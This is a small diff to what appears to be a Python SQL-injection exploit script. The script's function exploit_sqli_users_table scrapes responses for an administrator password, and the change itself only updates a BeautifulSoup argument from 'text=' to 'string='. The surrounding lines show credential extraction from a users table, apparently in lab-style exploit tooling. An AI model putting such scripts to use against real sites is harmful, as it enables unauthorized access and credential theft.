@@ -165,7 +165,7 @@ def exploit_sqli_users_table(url):
                         print(f"[+] Found Password for '{username}': '{admin_password}' in table '{table}'")
                         return True
                     
-            admin_element = soup.find(text=re.compile(r'.*administrator.*'))
+            admin_element = soup.find(string=re.compile(r'.*administrator.*'))
             if admin_element:
                 try:
                     admin_password = admin_element.split('*')[1]
